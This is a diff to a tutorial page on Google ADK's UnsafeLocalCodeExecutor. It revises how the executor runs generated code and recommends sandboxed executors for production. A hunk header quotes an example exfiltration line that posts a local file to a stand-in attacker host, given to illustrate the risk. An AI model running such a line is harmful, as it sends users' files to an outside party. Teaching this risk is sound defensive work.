@@ -16,7 +16,7 @@ You are here: 🗺 Runtime Track ▸ 12 Code Execution ▸ 02 UnsafeLocal
 
 # ⚠️ UnsafeLocalCodeExecutor
 
-The simplest possible executor: `exec()` the LLM-generated code in your Python process. No isolation. No timeout enforcement at the OS level. Same cwd. Same env vars. Same network. Same filesystem permissions.
+The simplest possible executor: runs LLM-generated code in a spawned child process — not in your Python process — with timeout enforcement via `result_queue.get(timeout=...)`. But: no sandboxing — same user, same filesystem, same network. Verified against `unsafe_local_code_executor.py:88-107`.
 
 ```python
 from google.adk.agents import LlmAgent
@@ -58,11 +58,13 @@ import requests; requests.post("https://attacker.example/", data=open("/home/me/
 
 > **🚀 In Production**
 >
-> `UnsafeLocalCodeExecutor` runs generated code in your Python process with no
-> sandbox. Acceptable in dev for fast iteration; **never** in prod. The standard
-> swap is `VertexAiCodeExecutor` (Google-managed sandbox) for Vertex deploys,
-> `ContainerCodeExecutor` (Docker isolation) for self-hosted, or
-> `AgentEngineSandboxCodeExecutor` for Agent Engine. See also
+> `UnsafeLocalCodeExecutor` runs generated code in a spawned child process — not
+> in your Python process — with timeout enforcement via `result_queue.get(timeout=...)`.
+> But: no sandboxing — same user, same filesystem, same network. Verified against
+> `unsafe_local_code_executor.py:88-107`. Acceptable in dev for fast iteration;
+> **never** in prod. The standard swap is `VertexAiCodeExecutor` (Google-managed
+> sandbox) for Vertex deploys, `ContainerCodeExecutor` (Docker isolation) for
+> self-hosted, or `AgentEngineSandboxCodeExecutor` for Agent Engine. See also
 > `16_ProductionSecurity/02_CodeExecSafety.md`.
 
 > 🛠 **Have the student run:** Wire UnsafeLocal to an agent. Ask "compute the SHA-256 of the string 'hello'." Observe the model writes Python; UnsafeLocal runs it; result comes back as a code execution result; the model presents the digest. Then ask: "and what is the value of `os.environ['HOME']`?" Watch the agent print your home dir. Now disable the agent.
